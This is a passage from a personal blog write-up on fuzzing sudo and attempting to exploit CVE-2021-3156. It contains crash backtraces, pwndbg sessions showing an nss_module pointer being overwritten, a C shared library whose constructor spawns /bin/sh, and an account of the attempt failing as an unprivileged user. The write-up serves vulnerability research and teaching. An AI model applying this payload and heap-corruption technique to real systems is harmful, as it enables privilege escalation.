</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x00007ffff7d32683&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;runas_getgroups&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./match.c:145&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#8  0x00007ffff7d202c7 in runas_setgroups () at ./set_perms.c:1714&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;8&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x00007ffff7d202c7&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;runas_setgroups&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./set_perms.c:1714&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#9  0x00007ffff7d1ead8 in set_perms (perm=5) at ./set_perms.c:281&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;9&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x00007ffff7d1ead8&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;set_perms&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;perm=5&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./set_perms.c:281&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#10 0x00007ffff7d16559 in sudoers_lookup (snl=0x7ffff7d5dce0 &lt;snl&gt;, pw=0x55555558ce58, validated=96, pwflag=0) at ./parse.c:303&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;10&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x00007ffff7d16559&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;sudoers_lookup&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;snl=0x7ffff7d5dce0 &lt;snl&gt;&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;pw=0x55555558ce58&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;validated=96&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;pwflag=0&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./parse.c:303&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#11 0x00007ffff7d21776 in sudoers_policy_main (argc=6, argv=0x7fffffffdd38, pwflag=0, env_add=0x0, verbose=false, closure=0x7fffffffd9c0) at ./sudoers.c:328&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;11&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x00007ffff7d21776&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;sudoers_policy_main&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;argc=6&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;argv=0x7fffffffdd38&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;pwflag=0&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;env_add=0x0&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;verbose=false&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;closure=0x7fffffffd9c0&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./sudoers.c:328&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#12 0x00007ffff7d1ca7c in sudoers_policy_check (argc=6, argv=0x7fffffffdd38, env_add=0x0, command_infop=0x7fffffffdaa8, argv_out=0x7fffffffdab0, user_env_out=0x7fffffffdab8) at ./policy.c:872&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;12&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x00007ffff7d1ca7c&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;sudoers_policy_check&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;argc=6&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;argv=0x7fffffffdd38&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;env_add=0x0&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;command_infop=0x7fffffffdaa8&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;argv_out=0x7fffffffdab0&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;user_env_out=0x7fffffffdab8&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./policy.c:872&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#13 0x0000555555572f88 in policy_check (plugin=0x555555583920 &lt;policy_plugin&gt;, argc=6, argv=0x7fffffffdd38, env_add=0x0, command_info=0x7fffffffdaa8, argv_out=0x7fffffffdab0, user_env_out=0x7fffffffdab8) at ./sudo.c:1186&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;13&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x0000555555572f88&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;policy_check&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;plugin=0x555555583920 &lt;policy_plugin&gt;&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;argc=6&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;argv=0x7fffffffdd38&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;env_add=0x0&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;command_info=0x7fffffffdaa8&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;argv_out=0x7fffffffdab0&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;user_env_out=0x7fffffffdab8&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./sudo.c:1186&#34;</span>
</span></span><span style=display:flex><span>      },
</span></span><span style=display:flex><span>      {
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;raw&#34;</span>: <span style=color:#e6db74>&#34;#14 0x000055555556e6ed in main (argc=8, argv=0x7fffffffdd28, envp=0x7fffffffdd70) at ./sudo.c:301&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;num&#34;</span>: <span style=color:#e6db74>&#34;14&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;addr&#34;</span>: <span style=color:#e6db74>&#34;0x000055555556e6ed&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;funcname&#34;</span>: <span style=color:#e6db74>&#34;main&#34;</span>,
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;args&#34;</span>: [
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;argc=8&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;argv=0x7fffffffdd28&#34;</span>,
</span></span><span style=display:flex><span>          <span style=color:#e6db74>&#34;envp=0x7fffffffdd70&#34;</span>
</span></span><span style=display:flex><span>        ],
</span></span><span style=display:flex><span>        <span style=color:#f92672>&#34;filename&#34;</span>: <span style=color:#e6db74>&#34;./sudo.c:301&#34;</span>
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    ],
</span></span><span style=display:flex><span>    <span style=color:#f92672>&#34;exit_code&#34;</span>: <span style=color:#ae81ff>300</span>
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We write one more hacky python script (<a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/heap-fuzzer/heap-fuzzer-crash-triage.py target=_blank rel="noopener noreferrer">heap-fuzzer-crash-triage.py</a>) that is able to read the JSON results file, parse it, and re-run the sudo binary exactly in the same way so that we can reproduce the crash. With some <code>cyclic_gen</code> magic and messing around with arguments, we figure out exactly which part of <code>argv</code> influences the parameter <code>module=0x4242424242422042</code>. It is a partial overwrite. Here is how the <code>module</code> parameter looks like under non-crashing execution:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> â–º 0x7ffff7eeedc0 &lt;__nss_module_get_function&gt;       push   r15
</span></span><span style=display:flex><span>   0x7ffff7eeedc2 &lt;__nss_module_get_function+2&gt;     push   r14
</span></span><span style=display:flex><span>   0x7ffff7eeedc4 &lt;__nss_module_get_function+4&gt;     push   r13
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> BACKTRACE <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span> â–º <span style=color:#ae81ff>0</span>   0x7ffff7eeedc0 __nss_module_get_function
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>1</span>   0x7ffff7eecfad __nss_lookup_function+13
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>2</span>   0x7ffff7e8bb8c internal_getgrouplist+188
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>3</span>   0x7ffff7e8be28 getgrouplist+104
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>4</span>   0x7ffff7fafde6 sudo_getgrouplist2_v1+208
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>5</span>   0x7ffff7d3b953 sudo_make_gidlist_item+481
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>6</span>   0x7ffff7d3a367 sudo_get_gidlist+560
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>7</span>   0x7ffff7d32683 runas_getgroups+221
</span></span><span style=display:flex><span>pwndbg&gt; $ p module
</span></span><span style=display:flex><span>$3 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>struct nss_module *<span style=color:#f92672>)</span> 0x555555588d90
</span></span><span style=display:flex><span>pwndbg&gt; $ p * module
</span></span><span style=display:flex><span>$2 <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>  state <span style=color:#f92672>=</span> 1,
</span></span><span style=display:flex><span>  functions <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    typed <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>      endaliasent <span style=color:#f92672>=</span> 0x244a4e5c2b67897,
</span></span><span style=display:flex><span>      endetherent <span style=color:#f92672>=</span> 0x244a4e521967897,
</span></span><span style=display:flex><span>      ....
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>,
</span></span><span style=display:flex><span>    untyped <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>0x244a4e5c2b67897, ..., 0x244a4e527967897<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>}</span>,
</span></span><span style=display:flex><span>  handle <span style=color:#f92672>=</span> 0x0,
</span></span><span style=display:flex><span>  next <span style=color:#f92672>=</span> 0x0,
</span></span><span style=display:flex><span>  name <span style=color:#f92672>=</span> 0x555555588fa8 <span style=color:#e6db74>&#34;files&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>After fiddling around, it seems like an off-by-one overflow is sufficient. With an off-by-one, and the fact that the overflow is comming from <code>argv</code>, the parameter <code>module=0x555555588d90</code> would look like <code>module=0x5555555800XX</code> afterwards. <code>XX</code> is bytes that we control and then a NULL byte follows, because <code>argv</code> arguments are NULL terminated. So, let&rsquo;s brute-force <code>XX</code> using <a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/heap-fuzzer/brutter.sh target=_blank rel="noopener noreferrer">brutter.sh</a> until our pre-conditions are met.</p><p>And apparently for <code>XX=01</code> it works! Here is the output from gdb when given an input that corrupts the <code>module</code> parameter to <code>0x555555580001</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span> â–º 0x7ffff7eeedc0 &lt;__nss_module_get_function&gt;       push   r15
</span></span><span style=display:flex><span>   0x7ffff7eeedc2 &lt;__nss_module_get_function+2&gt;     push   r14
</span></span><span style=display:flex><span>   0x7ffff7eeedc4 &lt;__nss_module_get_function+4&gt;     push   r13
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> BACKTRACE <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span> â–º <span style=color:#ae81ff>0</span>   0x7ffff7eeedc0 __nss_module_get_function
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>1</span>   0x7ffff7eecfad __nss_lookup_function+13
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>2</span>   0x7ffff7e8bb8c internal_getgrouplist+188
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>3</span>   0x7ffff7e8be28 getgrouplist+104
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>4</span>   0x7ffff7fafde6 sudo_getgrouplist2_v1+208
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>5</span>   0x7ffff7d3b953 sudo_make_gidlist_item+481
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>6</span>   0x7ffff7d3a367 sudo_get_gidlist+560
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>7</span>   0x7ffff7d32683 runas_getgroups+221
</span></span><span style=display:flex><span>pwndbg&gt; $ p module
</span></span><span style=display:flex><span>$5 <span style=color:#f92672>=</span> <span style=color:#f92672>(</span>struct nss_module *<span style=color:#f92672>)</span> 0x555555580001
</span></span><span style=display:flex><span>pwndbg&gt; $ p *module
</span></span><span style=display:flex><span>$4 <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>  state <span style=color:#f92672>=</span> 0,        // This is imporant
</span></span><span style=display:flex><span>  functions <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    typed <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>      endaliasent <span style=color:#f92672>=</span> 0x0,
</span></span><span style=display:flex><span>      endetherent <span style=color:#f92672>=</span> 0x0,
</span></span><span style=display:flex><span>      //...
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>,
</span></span><span style=display:flex><span>    untyped <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>0x0 &lt;repeats <span style=color:#ae81ff>64</span> times&gt;<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>}</span>,
</span></span><span style=display:flex><span>  handle <span style=color:#f92672>=</span> 0x0,
</span></span><span style=display:flex><span>  next <span style=color:#f92672>=</span> 0x0,
</span></span><span style=display:flex><span>  name <span style=color:#f92672>=</span> 0x555555580219 <span style=color:#e6db74>&#34;&#34;</span>  //This is important
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>pwndbg&gt; $ c
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> REGISTERS / show-flags off / show-compact-regs off <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>*RDI  0x55555558e320 â—‚â€” <span style=color:#e6db74>&#39;libnss_.so.2&#39;</span>
</span></span><span style=display:flex><span>*RIP  0x7ffff7f0a440 <span style=color:#f92672>(</span>__libc_dlopen_mode<span style=color:#f92672>)</span> â—‚â€” push rbx
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> DISASM / x86-64 / set emulate on <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span> â–º 0x7ffff7f0a440 &lt;__libc_dlopen_mode&gt;       push   rbx
</span></span><span style=display:flex><span>   0x7ffff7f0a441 &lt;__libc_dlopen_mode+1&gt;     sub    rsp, 0x30
</span></span><span style=display:flex><span>   0x7ffff7f0a445 &lt;__libc_dlopen_mode+5&gt;     mov    rax, qword ptr fs:<span style=color:#f92672>[</span>0x28<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span> BACKTRACE <span style=color:#f92672>]</span>
</span></span><span style=display:flex><span> â–º <span style=color:#ae81ff>0</span>   0x7ffff7f0a440 __libc_dlopen_mode
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>1</span>   0x7ffff7eee907 module_load+167
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>2</span>   0x7ffff7eeee05 __nss_module_get_function+69
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>3</span>   0x7ffff7eeee05 __nss_module_get_function+69
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>4</span>   0x7ffff7eecfad __nss_lookup_function+13
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>5</span>   0x7ffff7e8bb8c internal_getgrouplist+188
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>6</span>   0x7ffff7e8be28 getgrouplist+104
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>7</span>   0x7ffff7fafde6 sudo_getgrouplist2_v1+208
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>pwndbg&gt; $ frame
</span></span><span style=display:flex><span><span style=color:#75715e>#0  __libc_dlopen_mode (name=0x55555558e320 &#34;libnss_.so.2&#34;, mode=mode@entry=-2147483646) at ./elf/dl-libc.c:152</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>152</span>    in ./elf/dl-libc.c
</span></span><span style=display:flex><span>pwndbg&gt; $ x/1s $rdi
</span></span><span style=display:flex><span>0x55555558e320:    <span style=color:#e6db74>&#34;libnss_.so.2&#34;</span>
</span></span></code></pre></div><p>As you can see, the sudo binary is ready to load <code>libnss_.so.2</code>. However, this library does not exist in the system! Maybe with <code>LD_LIBRARY_PATH=. sudo</code> we can force sudo to load it (<em>dumb excitment kicks in</em>). So, we quickly prepare <a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/libnss_X/ target=_blank rel="noopener noreferrer">our malicious library</a>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;unistd.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>foo</span>() {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;foo</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#a6e22e>__attribute__</span>((constructor))
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>init</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>args[] <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;/bin/sh&#34;</span>,
</span></span><span style=display:flex><span>        NULL
</span></span><span style=display:flex><span>    };
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>execve</span>(args[<span style=color:#ae81ff>0</span>], args, NULL);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Let&rsquo;s try running <code>LD_LIBRARY_PATH=. sudo</code> now without gdb and corrupt the pointer to <code>module=0x555555580001</code>:</p><p><img src=/post-resources/CVE-2021-3156/images/failed-success.png alt=failed-success.png></p><p>And it works! Let&rsquo;s also re-enable ASLR as we had disabled it at some point. With ASLR and by using <a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/heap-fuzzer/brutter.sh target=_blank rel="noopener noreferrer">brutter.sh</a>, we are still able to sueccessfully execute our exploit and get a shell.</p><p>Let&rsquo;s finally now try our exploit as <code>user</code>:</p><p><img src=/post-resources/CVE-2021-3156/images/total-failure.png alt=total-failure.png></p><p>And it is a failure. Maybe we have to use a different value for <code>XX</code>? Let&rsquo;s switch back to ASLR off. Running <a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/heap-fuzzer/brutter.sh target=_blank rel="noopener noreferrer">brutter.sh</a> did not work. Even trying to brute-force 2 bytes does not work.</p><p>What is the issue here?</p><h3 id=pitfalls-and-hard-reality>Pitfalls and hard reality</h3><p>Well, one dumb thing that we did and is now biting us back is that we fuzzed the heap as <code>root</code>, because we wanted gdb. We relied on spawning <code>sudo</code> with gdb as root and we were lazy to implement a mechanism that allows to attach to <code>sudo</code> executed as <code>user</code>. The heap layout might be <em>slightly different enough</em> so that our exploit is now not corrupting the <code>module</code> pointer.</p><p>Another dumb thing is that we are using <code>LD_LIBRARY_PATH</code> with a setuid binary. Oh god. RTFM before jumping into action! Here is the <a href=https://man7.org/linux/man-pages/man8/ld-linux.so.8.html target=_blank rel="noopener noreferrer">man page</a>:</p><blockquote><p>If a shared object dependency does not contain a slash, then it<br>is searched for in the following order:</p><p>(1) Using the directories specified in the <code>DT_RPATH</code> dynamic<br>section attribute of the binary if present and DT_RUNPATH<br>attribute does not exist. Use of <code>DT_RPATH</code> is deprecated.</p><p>(2) <em><strong>Using the environment variable <code>LD_LIBRARY_PATH</code>, unless the<br>executable is being run in secure-execution mode (see<br>below), in which case this variable is ignored.</strong></em></p><p>&mldr;</p><p>A binary is executed in secure-execution mode if the <code>AT_SECURE</code><br>entry in the auxiliary vector (see getauxval(3)) has a nonzero<br>value. This entry may have a nonzero value for various reasons,<br>including:</p><ul><li><em><strong>The process&rsquo;s real and effective user IDs differ, or the real<br>and effective group IDs differ. This typically occurs as a<br>result of executing a set-user-ID or set-group-ID program.</strong></em></li></ul></blockquote><p>And yes we are running in secure-execution mode. This is also very easy to test with a our lib and a dummy binary. If the binary is setuid then <code>LD_LIBRARY_PATH</code> will not work.</p><p>Another thing is that our exploit uses <code>GCONV_PATH</code> in the environment variables. Here is the <a href=https://man7.org/linux/man-pages/man8/ld-linux.so.8.html target=_blank rel="noopener noreferrer">manual</a> once again:</p><blockquote><p>Secure-execution mode<br>For security reasons, if the dynamic linker determines that a<br>binary should be run in secure-execution mode, the effects of<br>some environment variables are voided or modified, and<br>furthermore those environment variables are stripped from the<br>environment, so that the program does not even see the<br>definitions. Some of these environment variables affect the<br>operation of the dynamic linker itself, and are described below.<br>Other environment variables treated in this way include:<br><em><strong><code>GCONV_PATH</code></strong></em>, <code>GETCONF_DIR</code>, <code>HOSTALIASES</code>, <code>LOCALDOMAIN</code>, <code>LOCPATH</code>,<br><code>MALLOC_TRACE</code>, <code>NIS_PATH</code>, <code>NLSPATH</code>, <code>RESOLV_HOST_CONF</code>, <code>RES_OPTIONS</code>,<br><code>TMPDIR</code>, and <code>TZDIR</code>.<br>&mldr;</p><p><code>LD_LIBRARY_PATH</code>: A list of directories in which to search for ELF libraries<br>at execution time. The items in the list are separated by<br>either colons or semicolons, and there is no support for<br>escaping either separator. A zero-length directory name<br>indicates the current working directory.</p><p><em><strong>This variable is ignored in secure-execution mode.</strong></em></p></blockquote><h2 id=conclusion>Conclusion</h2><p>Due to time constraints, this project ends here, unfortunately without exploiting <code>sudo</code> as user. It is not impossible, but would require some more significant engineering effort. Our initial goal of this journey was to learn more about fuzzing. Crafting an exploit for the bug was a bonus point.</p><p>It was a fun ride and we learned a lot. Going from zero (where are you bug?) to hero (RCE) definately takes a LOT of effort and there are a LOT of intermmediate steps. The pitfalls are numerous and each time you fall into one, you have to go steps back, redo things in the proper way, and then proceed. Otherwise, laziness will bite you back. Sometimes you have to fail first to know the answer afterwards. That is the nature of research anyway. The answer is potentially unknown.</p></div></article><hr><p class=articleTagsContainer><span>ï€« </span><strong>Tags:</strong>
<a href=/tags/cve>#CVE</a>
<a href=/tags/fuzzing>#fuzzing</a>
<a href=/tags/vulnerability-research>#vulnerability research</a></p></main><footer><hr><p><small>2024 &copy; Nikolaos Chalkiadakis</small></p><p><small><a href=https://gitlab.com/gabmus/hugo-ficurinia>Ficurinia theme</a> for <a href=https://gohugo.io>Hugo</a> by <a href=https://gabmus.org>Gabriele Musco</a>. Licensed under <a href=https://www.gnu.org/licenses/agpl-3.0.html>GNU AGPLv3</a>.</small></p></footer></div></div></div></body></html>